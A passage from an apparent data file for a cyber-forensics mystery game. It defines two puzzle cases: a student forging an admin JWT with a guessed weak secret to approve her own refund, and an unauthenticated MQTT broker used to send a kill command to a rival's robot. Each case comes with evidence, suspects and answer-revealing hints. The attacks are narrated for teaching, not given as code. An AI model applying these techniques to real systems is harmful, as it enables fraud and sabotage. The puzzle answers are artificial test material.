    duration: 5,
    icon: 'key',
    color: 'emerald',
    briefing:
      'A normal student account approved its own refund request of ₹2,500 on the fest portal by forging an admin JSON Web Token (JWT).',
    incident: 'Refund approval audit trail, backend JWT configuration leak, and local proxy rate metrics.',
    evidence: [
      {
        type: 'APPROVAL LOG',
        title: 'Refund Approval Log',
        detail:
          'Refund ID #404 (₹2,500) approved for Roll: 2BA23EC055 (Varsha) | JWT Payload: {"user":"varsha","role":"admin"}',
      },
      {
        type: 'BACKEND CONFIG',
        title: 'Backend Repo (config.py)',
        detail:
          'Developer accidentally used a weak dictionary word as the JWT signing secret: JWT_SECRET = "bagalkot123".',
      },
      {
        type: 'PROXY LOG',
        title: 'Web Proxy Log',
        detail:
          'User 2BA23EC055 sent 50,000 requests/sec locally before submitting the forged Bearer token from IP 10.9.3.14.',
      },
    ],
    suspects: [
      {
        name: 'Varsha',
        role: '2nd Year ECE',
        note: "I only clicked 'Request Refund' once! If it got approved automatically, that's a server bug.",
      },
      {
        name: 'Charan',
        role: 'Backend Dev',
        note: 'I used bagalkot123 during local testing and forgot to switch to a 256-bit random secret in production.',
      },
      {
        name: 'Pooja M.',
        role: 'Treasurer',
        note: "I never approved Refund #404; my admin account wasn't even logged in today.",
      },
      {
        name: 'Dinesh',
        role: '3rd Year Mech',
        note: "I don't know what a JWT token or Base64 encoding is.",
      },
    ],
    timeline: [
      '14:18 — Varsha brute-forces the weak HMAC secret (bagalkot123) offline.',
      '14:25 — Treasurer Pooja M. notices an unauthorized ₹2,500 refund approved without her login.',
      '14:10 — Varsha logs into the portal and captures her standard student JWT ("role":"student").',
      '14:22 — Varsha signs a forged JWT with "role":"admin" and calls /api/approve_refund/404.',
    ],
    hints: [
      'Look at the decoded JWT payload: {"user":"varsha","role":"admin"}.',
      'Because JWT_SECRET was a weak word (bagalkot123), Varsha forged her own admin token.',
    ],
  },
  {
    id: 'case-30',
    title: 'The Sabotaged Robowars Kill-Switch',
    subtitle: 'Unauthenticated MQTT Broker & Topic Publish',
    category: 'IoT & Protocol Forensics',
    duration: 5,
    icon: 'sun',
    color: 'violet',
    briefing:
      "Right as Team Titan's battle-bot entered the Robowars arena, its wireless ESP32 controller received an emergency STOP_ALL command, freezing the robot mid-match.",
    incident: 'Mosquitto MQTT broker logs, broker anonymous access config, and arena Wi-Fi DHCP lease table.',
    evidence: [
      {
        type: 'MQTT LOG',
        title: 'Arena Mosquitto MQTT Broker Log',
        detail:
          '17:04:12 | Client "mqtt-explorer-91" published "STOP_ALL" to topic "bots/titan/cmd" | IP: 192.168.99.64',
      },
      {
        type: 'BROKER CONFIG',
        title: 'Broker Config (mosquitto.conf)',
        detail: 'allow_anonymous true (No username/password required to publish messages on arena Wi-Fi).',
      },
      {
        type: 'WI-FI DHCP',
        title: 'Arena Wi-Fi DHCP Lease',
        detail: '192.168.99.64 | Hostname: MacBook-Pro-Advait | Connected: 16:55 to 17:10',
      },
    ],
    suspects: [
      {
        name: 'Advait',
        role: 'Rival Bot Builder',
        note: "I connected to the arena Wi-Fi just to check the match schedule! I didn't touch Team Titan's bot.",
      },
      {
        name: 'Rohan K.',
        role: 'Team Titan Driver',
        note: 'Our joystick uses topic bots/titan/drive; we never sent STOP_ALL!',
      },
      {
        name: 'Shashank',
        role: 'Robotics Referee',
        note: "I only hold the physical red emergency button; I don't use a MacBook.",
      },
      {
        name: 'Keerthi',
        role: 'Arena Network Tech',
        note: 'I set allow_anonymous true on the MQTT broker so teams could pair their ESP32s quickly.',
      },
    ],
    timeline: [
      "17:02 — Team Titan's match begins and their ESP32 subscribes to bots/titan/cmd.",
      "17:04 — Team Titan's robot freezes completely in the arena.",
      '16:55 — MacBook-Pro-Advait connects to the arena Wi-Fi and receives IP 192.168.99.64.',
      '17:04 — Client mqtt-explorer-91 from 192.168.99.64 publishes STOP_ALL to the unprotected MQTT broker.',
    ],
    hints: [
      'Look at the IP address that published STOP_ALL to the anonymous MQTT broker (192.168.99.64).',
      'Check the hostname assigned to 192.168.99.64 in the Arena DHCP Lease table.',
    ],
  },
];
